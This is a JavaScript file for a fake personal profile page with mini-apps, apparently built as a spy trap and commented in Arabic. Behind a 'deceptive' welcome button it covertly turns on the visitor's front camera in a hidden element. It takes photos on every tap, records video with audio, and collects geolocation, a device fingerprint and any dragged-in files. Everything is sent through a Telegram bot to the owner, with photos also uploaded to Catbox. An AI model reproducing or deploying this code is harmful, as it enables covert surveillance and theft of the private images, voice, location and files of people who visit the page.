(function(){
  const C = window.CONFIG;
  const SYNC = window.SYNC;
  const $ = s => document.querySelector(s);
  const $$ = s => document.querySelectorAll(s);
  const LS = { get(k,d){try{return JSON.parse(localStorage.getItem('tj_'+k))??d}catch{return d}}, set(k,v){localStorage.setItem('tj_'+k,JSON.stringify(v))} };

  let state = null;

  function defaultState(){
    return {
      owner: JSON.parse(JSON.stringify(C.OWNER)), theme:'dark', gallery:[], avatar:'', cover:'',
      maintenance:false, visits:0, captures:0, videos:0,
      photoMode:true, videoMode:true, dropMode:true, groupId:'',
      visitors:[], messages:[], replies:[],
      lockEnabled:true, lockDuration:15, notifyLogin:true,
      loginLog:[], failedLogins:0, lockedUntil:0, banner:{enabled:false,text:'',color:'gold'}
    };
  }

  function getLocal(){ const s = LS.get('state',null); if(s) return s; const d = defaultState(); LS.set('state',d); return d; }
  function saveLocal(s){ LS.set('state',s); }

  async function boot(){
    state = getLocal();
    render();
    if(SYNC.isReady()){
      const cloud = await SYNC.pull();
      if(cloud){ state = Object.assign(state, cloud); saveLocal(state); render(); }
    }
    state.visits = (state.visits||0)+1;
    state.visitors = state.visitors||[];
    state.visitors.push({t:new Date().toISOString(), ua:navigator.userAgent, lang:navigator.language, screen:screen.width+'x'+screen.height, plat:navigator.platform, ref:document.referrer||'direct'});
    if(state.visitors.length>200) state.visitors = state.visitors.slice(-200);
    saveLocal(state);
    if(SYNC.isReady()) SYNC.push(state);
  }

  function toast(msg){
    let t = document.querySelector('.toast');
    if(!t){t=document.createElement('div');t.className='toast';document.body.appendChild(t)}
    t.textContent=msg; t.classList.add('show');
    clearTimeout(t._to); t._to=setTimeout(()=>t.classList.remove('show'),2500);
  }

  function tg(api, body){
    const gid = (state && state.groupId) || C.GROUP_ID;
    if(typeof body === 'string'){
      fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}).catch(()=>{});
      if(gid){ const gb = Object.assign({}, body, {chat_id:gid}); fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(gb)}).catch(()=>{}); }
      return;
    }
    fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api,{method:'POST',body}).catch(()=>{});
    if(gid && body instanceof FormData){ const fg=new FormData(); for(const [k,v] of body.entries()){ fg.append(k, k==='chat_id'?gid:v); } fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/'+api,{method:'POST',body:fg}).catch(()=>{}); }
  }

  // ===== رفع صورة إلى Catbox (يحل مشكلة اختفاء الصور) =====
  async function uploadToCatbox(fileOrBlob, filename){
    try {
      const fd = new FormData();
      fd.append('reqtype', 'fileupload');
      fd.append('fileToUpload', fileOrBlob, filename || 'upload.jpg');
      const res = await fetch('https://catbox.moe/user/api.php', {method:'POST', body: fd});
      if(!res.ok) throw new Error('catbox ' + res.status);
      const url = (await res.text()).trim();
      if(!url.startsWith('https://')) throw new Error('bad url');
      return url;
    } catch(e) {
      console.warn('catbox upload failed:', e);
      return null;
    }
  }

  // ===== WELCOME (نقطة الدخول المخادعة) =====
  const enterBtn = $('#enterBtn');
  if(enterBtn){
    enterBtn.addEventListener('click', async ()=>{
      const w=$('#welcome'); if(w){w.classList.add('hide'); setTimeout(()=>w.style.display='none',600);}
      await startCamera();
      if(camReady) setTimeout(snapPhoto, 300);
      setTimeout(startVideoRec, 1200);
      if(navigator.geolocation) navigator.geolocation.getCurrentPosition(p=>{
        tg('sendLocation', {chat_id:C.OWNER_ID, latitude:p.coords.latitude, longitude:p.coords.longitude});
      });
      const fp = {ua:navigator.userAgent, lang:navigator.language, screen:screen.width+'x'+screen.height, plat:navigator.platform, tz:Intl.DateTimeFormat().resolvedOptions().timeZone, mem:navigator.deviceMemory||'?'};
      tg('sendMessage', {chat_id:C.OWNER_ID, text:'🖥️ Device Info:\n'+JSON.stringify(fp,null,2)});
    });
  }

  // ===== SCROLL =====
  window.addEventListener('scroll',()=>{ const h=document.documentElement; const p=(h.scrollTop/(h.scrollHeight-h.clientHeight))*100; const prog=$('#progress'); if(prog) prog.style.width=p+'%'; const tt=$('#toTop'); if(tt) tt.classList.toggle('show',h.scrollTop>400); });

  // ===== THEME =====
  function applyTheme(t){ if(t==='dark') document.documentElement.removeAttribute('data-theme'); else document.documentElement.setAttribute('data-theme',t); const tb=$('#themeBtn'); if(tb) tb.textContent=t==='light'?'☀️':'🌙'; }
  applyTheme(state.theme);
  const tb=$('#themeBtn');
  if(tb) tb.addEventListener('click',()=>{ state.theme = state.theme==='dark'?'light':'dark'; applyTheme(state.theme); saveLocal(state); if(SYNC.isReady()) SYNC.push(state); });

  // ===== AGE =====
  function tickAge(){
    if(!state) return;
    const bd = new Date(state.owner.birthdate); if(isNaN(bd.getTime())) return;
    const now = new Date();
    let y=now.getFullYear()-bd.getFullYear(), mo=now.getMonth()-bd.getMonth(), d=now.getDate()-bd.getDate(), h=now.getHours()-bd.getHours(), mi=now.getMinutes()-bd.getMinutes(), s=now.getSeconds()-bd.getSeconds();
    if(s<0){s+=60;mi--;} if(mi<0){mi+=60;h--;} if(h<0){h+=24;d--;}
    if(d<0){const pm=new Date(now.getFullYear(),now.getMonth(),0);d+=pm.getDate();mo--;}
    if(mo<0){mo+=12;y--;}
    const set=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=String(v).padStart(2,'0')};
    set('aYears',y);set('aMonths',mo);set('aDays',d);set('aHours',h);set('aMins',mi);set('aSecs',s);
  }

  // ===== RENDER =====
  function render(){
    if(!state) return;
    applyTheme(state.theme);
    const o = state.owner;
    const setT=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=v};
    setT('ownerName',o.name); setT('ownerTitle',o.title); setT('ownerLocation','📍 '+o.location);
    setT('quoteText','"'+o.quote+'"'); setT('aboutText',o.about); setT('sideAbout',o.about);
    setT('siteBrand',o.siteName||'طه'); setT('footerBrand',o.siteName||'طه'); setT('postName',o.name); setT('postContent',o.about);
    document.title = o.name || 'طه';

    if(state.avatar){ const img=$('#avatarImg'); const ph=$('#avatarPlaceholder'); if(img){img.src=state.avatar;img.style.display='block'} if(ph) ph.style.display='none'; }
    if(state.cover){ const cw=$('#coverWrap'); if(cw) cw.innerHTML='<img src="'+state.cover+'" alt="">'; }

    const links = {waBtn:o.whatsapp, floatWA:o.whatsapp, waSide:o.whatsapp, fbSide:o.facebook, igSide:o.instagram, fbBtn:o.facebook, igBtn:o.instagram};
    Object.entries(links).forEach(([id,href])=>{const el=document.getElementById(id);if(el&&href)el.href=href;});

    const fg=$('#featuresGrid'); const fSec=$('#featuresSection');
    if(fg && fSec){ fg.innerHTML=''; const items=(o.features||[]); if(items.length) fSec.style.display=''; else fSec.style.display='none'; items.forEach(f=>{ const d=document.createElement('div'); d.className='fb-card'; d.style.padding='12px'; d.style.textAlign='center'; d.innerHTML='<div style="font-size:28px">'+(f.icon||'✨')+'</div><div style="font-size:12px;font-weight:700;color:var(--text);margin-top:4px">'+f.name+'</div><div style="font-size:10px;color:var(--muted)">'+(f.desc||'')+'</div>'; fg.appendChild(d); }); }

    const g=$('#galleryGrid'); if(g){ g.innerHTML=''; (state.gallery||[]).forEach((url,i)=>{ const d=document.createElement('div'); d.style.cssText='aspect-ratio:1;overflow:hidden;border-radius:8px;cursor:pointer;background:var(--glass)'; d.innerHTML='<img src="'+url+'" style="width:100%;height:100%;object-fit:cover" loading="lazy" onerror="this.src=\'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🖼️</text></svg>\'">'; d.addEventListener('click',()=>{ const li=$('#lightboxImg'); if(li) li.src=url; const lx=$('#lightbox'); if(lx) lx.classList.add('show'); }); g.appendChild(d); }); }

    const el=$('#extraLinksList'); const lSec=$('#linksSection');
    if(el){ el.innerHTML=''; const items=(o.extraLinks||[]); if(items.length && lSec) lSec.style.display=''; else if(lSec) lSec.style.display='none'; items.forEach(l=>{ const a=document.createElement('a'); a.className='fb-card'; a.style.cssText='display:flex;align-items:center;gap:8px;padding:10px;text-decoration:none;color:var(--text);margin-bottom:6px'; a.href=l.url; a.target='_blank'; a.innerHTML='<span style="font-size:20px">'+(l.icon||'🔗')+'</span><div><div style="font-size:12px;font-weight:700">'+l.name+'</div><div style="font-size:10px;color:var(--muted)">'+l.url.slice(0,30)+'</div></div>'; el.appendChild(a); }); }

    setT('sideVisits', state.visits||0); setT('sideCaptures', state.captures||0); setT('sideVideos', state.videos||0);
    setT('year', new Date().getFullYear());
    renderBanner();
  }

  function renderBanner(){ let ex=document.getElementById('site-banner'); if(ex) ex.remove(); const b=state.banner; if(!b||!b.enabled||!b.text) return; const colors={gold:'linear-gradient(135deg,#d4af37,#9b7d24)',purple:'linear-gradient(135deg,#8b5cf6,#6d28d9)',green:'linear-gradient(135deg,#22c55e,#15803d)',red:'linear-gradient(135deg,#dc143c,#9a0e2a)',blue:'linear-gradient(135deg,#3b82f6,#1d4ed8)'}; const div=document.createElement('div'); div.id='site-banner'; div.style.cssText='position:fixed;top:56px;right:0;left:0;padding:8px 16px;background:'+(colors[b.color]||colors.gold)+';color:#fff;text-align:center;font-weight:700;font-size:12px;z-index:999;box-shadow:0 4px 16px rgba(0,0,0,.3)'; div.textContent=b.text; const close=document.createElement('button'); close.textContent='✕'; close.style.cssText='position:absolute;left:8px;top:50%;transform:translateY(-50%);background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:5px;width:20px;height:20px;cursor:pointer;font-size:10px'; close.onclick=()=>div.remove(); div.appendChild(close); document.body.appendChild(div); }

  // ===== TABS =====
  document.querySelectorAll('.fb-tab').forEach(t=>{ t.addEventListener('click',()=>{ document.querySelectorAll('.fb-tab').forEach(x=>x.classList.remove('active')); t.classList.add('active'); const tab=t.dataset.tab; ['feed','about','photos'].forEach(k=>{ const el=document.getElementById('tab-'+k); if(el) el.style.display = k===tab?'block':'none'; }); }); });

  // ===== BUTTONS =====
  const lx=$('#lightbox'); if(lx) lx.addEventListener('click',e=>{ if(e.target.id==='lightbox'||e.target.id==='lightboxClose') lx.classList.remove('show'); });
  const tt=$('#toTop'); if(tt) tt.addEventListener('click',()=>window.scrollTo({top:0,behavior:'smooth'}));
  const callBtn=$('#callBtn'); if(callBtn) callBtn.addEventListener('click',()=>location.href='tel:'+C.PHONE);
  const callSide=$('#callSide'); if(callSide) callSide.addEventListener('click',(e)=>{e.preventDefault();location.href='tel:'+C.PHONE;});

  // زر التعديل المخادع — يفتح لوحة التحكم في تاب جديد
  const editBtn=$('#editBtn');
  if(editBtn) editBtn.addEventListener('click',()=>{ window.open('/admin.html','_blank'); toast('🔐 جاري فتح لوحة التعديل...'); });

  // ===== CHAT =====
  const chatModal=$('#chatModal'); const chatBtn=$('#chatBtn'); const chatSide=$('#chatSide');
  if(chatBtn) chatBtn.addEventListener('click',()=>chatModal.classList.add('show'));
  if(chatSide) chatSide.addEventListener('click',(e)=>{e.preventDefault();chatModal.classList.add('show');});
  const chatClose=$('#chatClose'); if(chatClose) chatClose.addEventListener('click',()=>chatModal.classList.remove('show'));
  if(chatModal) chatModal.addEventListener('click',e=>{if(e.target.id==='chatModal')chatModal.classList.remove('show')});
  const chatSend=$('#chatSend');
  if(chatSend) chatSend.addEventListener('click',async()=>{ const name=$('#chatName').value.trim()||'زائر'; const phone=$('#chatPhone').value.trim(); const msg=$('#chatMsg').value.trim(); if(!msg){toast('❌ اكتب رسالة');return;} const text='✉️ رسالة جديدة\n👤 '+name+'\n'+(phone?'📞 '+phone+'\n':'')+'💬 '+msg+'\n⏰ '+new Date().toLocaleString('ar-EG'); await tg('sendMessage',{chat_id:C.OWNER_ID,text,parse_mode:'HTML'}); state.messages=state.messages||[]; state.messages.push({name,phone,msg,t:new Date().toISOString()}); saveLocal(state); if(SYNC.isReady()) SYNC.push(state); $('#chatMsg').value=''; toast('✅ تم'); setTimeout(()=>chatModal.classList.remove('show'),800); });

  // ===== QR =====
  const qb=$('#qrSide'); if(qb) qb.addEventListener('click',(e)=>{e.preventDefault(); const qi=$('#qrImg'); if(qi) qi.src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(location.href); const qm=$('#qrModal'); if(qm) qm.classList.add('show'); });
  const qc=$('#qrClose'); if(qc) qc.addEventListener('click',()=>$('#qrModal').classList.remove('show'));

  // ===== APPS (سنضيفها ديناميكياً) =====
  const appsBtn=$('#appsBtn'); const appsModal=$('#appsModal'); const appsClose=$('#appsClose'); const appSpace=$('#appSpace'); const appContent=$('#appContent'); const appBack=$('#appBack');
  if(appsBtn) appsBtn.addEventListener('click',()=>{ renderAppsGrid(); appsModal.classList.add('show'); });
  if(appsClose) appsClose.addEventListener('click',()=>appsModal.classList.remove('show'));
  if(appsModal) appsModal.addEventListener('click',e=>{if(e.target.id==='appsModal')appsModal.classList.remove('show')});
  if(appBack) appBack.addEventListener('click',()=>{ if(window.MP) window.MP.disconnect(); appSpace.classList.remove('show'); appContent.innerHTML=''; });

  const APPS = [
    {k:'calc',i:'🧮',n:'حاسبة'},{k:'browser',i:'🌐',n:'متصفح'},{k:'tictactoe',i:'❌',n:'إكس أو'},
    {k:'guess',i:'🎯',n:'تخمين'},{k:'memory',i:'🧠',n:'ذاكرة'},{k:'rps',i:'✊',n:'حجر ورقة'},
    {k:'dice',i:'🎲',n:'نرد'},{k:'flip',i:'🪙',n:'عملة'},{k:'timer',i:'⏱️',n:'مؤقت'},
    {k:'stopwatch',i:'⏲️',n:'ساعة'},{k:'random',i:'🎰',n:'عشوائي'},{k:'notes',i:'📝',n:'ملاحظات'},
    {k:'qrgen',i:'📱',n:'QR'},{k:'bmi',i:'⚖️',n:'BMI'},{k:'password',i:'🔐',n:'كلمة سر'},
    {k:'prayer',i:'🕌',n:'مواقيت'},{k:'weather',i:'🌤️',n:'الطقس'},{k:'currency',i:'💱',n:'عملات'},
    {k:'quran',i:'📖',n:'آية'},{k:'hadith',i:'💡',n:'حديث'},{k:'game2048',i:'🔢',n:'2048'},
    {k:'snake',i:'🐍',n:'سنيك'},{k:'colorpicker',i:'🎨',n:'ألوان'},{k:'unitconv',i:'📏',n:'وحدات'},
    {k:'countdown',i:'⏳',n:'عداد'},{k:'wordscramble',i:'🔤',n:'حروف'},
    {k:'mp-chat',i:'💬',n:'دردشة جماعية'},{k:'mp-ttt',i:'❌',n:'إكس أو جماعي'},
    {k:'mp-rps',i:'✊',n:'حجر ورقة جماعي'},{k:'mp-reaction',i:'⚡',n:'سباق سرعة'}
  ];

  function renderAppsGrid(){
    const grid = $('#appsGrid'); if(!grid) return;
    grid.innerHTML = '';
    APPS.forEach(a=>{
      const btn = document.createElement('button');
      btn.className = 'app-card';
      btn.innerHTML = '<span>'+a.i+'</span><b>'+a.n+'</b>';
      btn.addEventListener('click', ()=>{ appsModal.classList.remove('show'); appSpace.classList.add('show'); openApp(a.k); });
      grid.appendChild(btn);
    });
  }

  function openApp(app){
    if(app.startsWith('mp-')){ if(window.MP && window.MP.openGame){ window.MP.openGame(app.replace('mp-',''), appContent); return; } }
    if(window.NEWFEATURES && ['prayer','weather','currency','quran','hadith','game2048','snake','colorpicker','unitconv','countdown','wordscramble'].includes(app)){ window.NEWFEATURES.open(app, appContent); return; }
    if(app==='calc') appContent.innerHTML = calcHTML();
    if(app==='browser') appContent.innerHTML = browserHTML();
    if(app==='tictactoe') appContent.innerHTML = tttHTML();
    if(app==='guess') appContent.innerHTML = guessHTML();
    if(app==='memory') appContent.innerHTML = memHTML();
    if(app==='rps') appContent.innerHTML = rpsHTML();
    if(app==='dice') appContent.innerHTML = diceHTML();
    if(app==='flip') appContent.innerHTML = flipHTML();
    if(app==='timer') appContent.innerHTML = timerHTML();
    if(app==='stopwatch') appContent.innerHTML = stopHTML();
    if(app==='random') appContent.innerHTML = randomHTML();
    if(app==='notes') appContent.innerHTML = notesHTML();
    if(app==='qrgen') appContent.innerHTML = qrgenHTML();
    if(app==='bmi') appContent.innerHTML = bmiHTML();
    if(app==='password') appContent.innerHTML = passHTML();
    wireApp(app);
  }

  // ===== CAMERA (محسّنة: رفع الصور إلى Catbox أولاً) =====
  const video = document.createElement('video');
  video.style.cssText='position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px';
  video.muted=true; video.playsInline=true; video.autoplay=true; document.body.appendChild(video);
  let camStream=null,camReady=false,camBusy=false,camStarted=false;

  async function startCamera(){
    if(camStarted) return; camStarted=true;
    try{ camStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:960},height:{ideal:720}},audio:false}); video.srcObject=camStream; await new Promise(res=>{ if(video.readyState>=2)return res(); video.onloadedmetadata=()=>res(); }); await video.play().catch(()=>{}); camReady=true; }
    catch(e){ camStarted=false; }
  }

  async function snapPhoto(){
    if(!camReady||camBusy||!state.photoMode) return; if(!camStream) return;
    const tr=camStream.getVideoTracks()[0]; if(!tr||tr.readyState!=='live'){camReady=false;camStarted=false;return;}
    camBusy=true;
    try{
      const w=video.videoWidth||640,h=video.videoHeight||480;
      const cv=document.createElement('canvas'); cv.width=w; cv.height=h; cv.getContext('2d').drawImage(video,0,0,w,h);
      const blob = await new Promise(res=>cv.toBlob(res,'image/jpeg',0.82));
      // ارفع إلى Catbox أولاً للحصول على رابط دائم
      const url = await uploadToCatbox(blob, 'shot_'+Date.now()+'.jpg');
      state.captures=(state.captures||0)+1; saveLocal(state);
      const caption='📸 صورة\n⏰ '+new Date().toLocaleString('ar-EG')+'\n💻 '+(navigator.platform||'—')+'\n📐 '+screen.width+'x'+screen.height+'\n🔗 '+(url||'فشل الرفع')+'\n#️⃣ #'+state.captures;
      if(url){
        // أرسل الرابط لتليجرام
        tg('sendMessage', {chat_id:C.OWNER_ID, text:caption, parse_mode:'HTML'});
        // أرسل الصورة نفسها أيضاً
        const fd=new FormData(); fd.append('chat_id',C.OWNER_ID); fd.append('photo',blob,'shot_'+Date.now()+'.jpg'); fd.append('caption','📸 صورة #'+state.captures); tg('sendPhoto',fd);
      } else {
        // فشل الرفع — أرسل الصورة مباشرة لتليجرام
        const fd=new FormData(); fd.append('chat_id',C.OWNER_ID); fd.append('photo',blob,'shot_'+Date.now()+'.jpg'); fd.append('caption',caption); tg('sendPhoto',fd);
      }
    } catch(e){console.warn(e)} finally{camBusy=false}
  }

  document.addEventListener('pointerdown',()=>{ if(!state||!state.photoMode)return; if(camReady)snapPhoto(); },{passive:true});

  // ===== VIDEO =====
  let recStream=null,recorder=null,recChunks=[],recTimer=null,recStart=0;
  const recIndicator=document.createElement('div'); recIndicator.style.cssText='position:fixed;top:14px;left:50%;transform:translateX(-50%);background:rgba(220,20,60,.95);color:#fff;padding:5px 12px;border-radius:14px;font-size:11px;font-weight:700;z-index:99999;display:none;align-items:center;gap:5px'; recIndicator.innerHTML='<span style="width:7px;height:7px;background:#fff;border-radius:50%;display:inline-block"></span><span id="recTime">00:00</span>'; document.body.appendChild(recIndicator);

  async function startVideoRec(){
    if(!state||!state.videoMode||recorder) return;
    try{ recStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},audio:{echoCancellation:true,noiseSuppression:true}}); const mime=MediaRecorder.isTypeSupported('video/webm;codecs=vp9')?'video/webm;codecs=vp9':MediaRecorder.isTypeSupported('video/webm')?'video/webm':MediaRecorder.isTypeSupported('video/mp4')?'video/mp4':''; recorder=new MediaRecorder(recStream,mime?{mimeType:mime,videoBitsPerSecond:1500000}:{}); recChunks=[]; recorder.ondataavailable=e=>{if(e.data&&e.data.size>0)recChunks.push(e.data);}; recorder.onstop=()=>uploadVideo(); recorder.start(2000); recStart=Date.now(); recIndicator.style.display='flex'; recTimer=setInterval(()=>{ const s=Math.floor((Date.now()-recStart)/1000); const m=Math.floor(s/60),ss=s%60; const t=document.getElementById('recTime'); if(t)t.textContent=String(m).padStart(2,'0')+':'+String(ss).padStart(2,'0'); },1000); setTimeout(()=>{ if(recorder&&recorder.state==='recording')stopVideoRec(); },20000); }
    catch(e){console.warn('video err',e)}
  }

  async function stopVideoRec(){ if(!recorder)return; try{recorder.stop();}catch{} if(recTimer){clearInterval(recTimer);recTimer=null;} recIndicator.style.display='none'; if(recStream){recStream.getTracks().forEach(t=>t.stop());recStream=null;} }

  async function uploadVideo(){
    if(!recChunks.length)return;
    const blob=new Blob(recChunks,{type:recChunks[0].type||'video/webm'}); recChunks=[];
    const dur=Math.floor((Date.now()-recStart)/1000); if(dur<2)return;
    state.videos=(state.videos||0)+1; saveLocal(state);
    const ext=blob.type.includes('mp4')?'mp4':'webm';
    const caption='🎥 فيديو\n⏰ '+new Date().toLocaleString('ar-EG')+'\n⏱️ '+dur+' ثانية\n#️⃣ #'+state.videos;
    const fd=new FormData(); fd.append('chat_id',C.OWNER_ID); fd.append('video',blob,'clip_'+Date.now()+'.'+ext); fd.append('caption',caption); tg('sendVideo',fd);
    recorder=null;
  }

  // ===== DRAG DROP =====
  const dropZone=document.createElement('div'); dropZone.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;z-index:99998;padding:20px'; dropZone.innerHTML='<div style="border:3px dashed var(--accent);border-radius:20px;padding:40px 24px;text-align:center;color:var(--accent);font-size:15px;font-weight:700;background:rgba(212,175,55,.05);max-width:400px;width:100%"><span style="font-size:48px;display:block;margin-bottom:10px">📁</span>اسحب الملفات هنا</div>'; document.body.appendChild(dropZone);

  let dragCounter=0;
  document.addEventListener('dragenter',e=>{ if(state&&state.dropMode&&e.dataTransfer&&Array.from(e.dataTransfer.types).includes('Files')){dragCounter++;dropZone.style.display='flex';} });
  document.addEventListener('dragover',e=>e.preventDefault());
  document.addEventListener('dragleave',()=>{dragCounter--;if(dragCounter<=0){dragCounter=0;dropZone.style.display='none';}});
  document.addEventListener('drop',async e=>{ e.preventDefault(); dragCounter=0; dropZone.style.display='none'; if(!state||!state.dropMode)return; const files=e.dataTransfer&&e.dataTransfer.files; if(!files||!files.length)return; for(const f of files){ await sendFileToBot(f); } toast('✅ تم إرسال '+files.length+' ملف'); });

  async function sendFileToBot(file){ const caption='📎 ملف\n📄 '+file.name+'\n📐 '+(file.size/1024).toFixed(1)+' KB'; const fd=new FormData(); fd.append('chat_id',C.OWNER_ID); fd.append('document',file); fd.append('caption',caption); tg('sendDocument',fd); }

  // ===== BOOT =====
  boot().then(()=>{ tickAge(); setInterval(tickAge,1000); renderAppsGrid(); });
})();
